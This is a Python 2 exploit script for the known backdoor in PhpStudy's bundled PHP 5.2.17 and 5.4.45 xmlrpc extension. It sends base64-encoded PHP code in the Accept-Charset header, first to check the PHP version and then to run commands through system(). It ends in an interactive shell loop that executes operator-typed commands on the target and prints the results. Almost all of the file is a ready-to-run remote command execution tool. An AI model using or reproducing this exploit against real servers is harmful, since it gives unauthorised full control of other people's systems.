#coding=utf-8


import requests
import sys
import base64

'''
=== .\php\php-5.2.17\ext\php_xmlrpc.dll ===
@eval(%s('%s'));
%s;@eval(%s('%s'));
=== .\php\php-5.4.45\ext\php_xmlrpc.dll ===
@eval(%s('%s'));
%s;@eval(%s('%s'));

.\php\php-5.2.17\ext\php_xmlrpc.dll
.\php\php-5.4.45\ext\php_xmlrpc.dll


'''

banner = r'''

        _                  _               _        
       | |                | |             | |       
 _ __  | |__   _ __   ___ | |_  _   _   __| | _   _ 
| '_ \ | '_ \ | '_ \ / __|| __|| | | | / _` || | | |
| |_) || | | || |_) |\__ \| |_ | |_| || (_| || |_| |
| .__/ |_| |_|| .__/ |___/ \__| \__,_| \__,_| \__, |
| |           | |                              __/ |
|_|           |_|                             |___/ 
                                                                        

     PhpStudy  BackDoor For php 5.2.17 and 5.4.45

               Python By jas502n

      Usage: python exp.py http://x.x.x.x/
'''
print banner


def check_phpversion(url):
    # echo PHP_VERSION;
    payload = base64.b64encode("echo PHP_VERSION;")
    # print payload
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Connection": "close",
    "accept-charset": "%s"%payload,
    "Accept-Encoding": "gzip,deflate",
    "Upgrade-Insecure-Requests": "1"
    }
    r =requests.get(url,headers=headers)
    if r.status_code ==200 and "5.4" in r.text or '5.2' in r.text:
        print "\n>>>>PhpStudy Backdoor Vuln Exit! \n\n>>>>Current php_version =%s" % r.text.split('\n')[0]
        print "\n>>>>Server= %s" % r.headers.get('Server')
        command_exec(url)
    else:
        "No BackDoor Exit!"


def command_exec(url):
    while 1:
        cmd = raw_input("\n>>>Command= ")
        if cmd == "exit":
            break
        else:
            payload = base64.b64encode("system('%s');echo md5('phpstudy');"% cmd)
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Connection": "close",
            "accept-charset": "%s" % payload,
            "Accept-Encoding": "gzip,deflate",
            "Upgrade-Insecure-Requests": "1"
            }
            r1 =requests.get(url,headers=headers)
            if r1.status_code ==200 and '8d92c91875122d5471066f7bba32d8da' in r1.text:
                print "___________________________________________________\n\n%s\n___________________________________________________" % r1.content.split('8d92c91875122d5471066f7bba32d8da')[0]
            else:
                "Command EXEC Fail!"

if __name__ == '__main__':
    # url = "http://172.16.9.174/"
    url = sys.argv[1]
    check_phpversion(url)
